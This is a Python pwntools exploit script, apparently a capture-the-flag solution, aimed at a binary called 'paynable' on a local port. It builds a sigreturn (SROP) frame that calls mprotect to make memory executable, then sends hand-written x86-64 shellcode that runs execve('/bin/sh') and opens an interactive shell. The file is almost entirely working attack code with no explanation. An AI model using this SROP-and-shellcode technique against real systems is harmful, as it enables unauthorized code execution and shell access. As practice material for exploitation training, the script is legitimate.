#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./paynable
from pwn import *
from time import sleep
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./paynable')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)

#io = start()
io = remote('localhost',1557)

main = 0x40100c

syscall = 0x40101e

srop = SigreturnFrame(kernel = 'amd64')

srop.rax = 0xa
srop.rdi = 0x400000
srop.rdx = 0x7
srop.rsi = 0x1000
srop.rsp = 0x400018
srop.rip = syscall


pay_1 = p64(main)+p64(syscall)+bytes(srop)

io.send(pay_1)

sleep(1)

px2 = p64(syscall)+b'A'*7

io.send(px2)

shellcode = b'\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x54\x5F\x31\xF6\x31\xD2\x31\xC0\xB0\x3B\x0F\x05'

sleep(1)

io.send(p64(0x400020)+shellcode)

io.interactive()

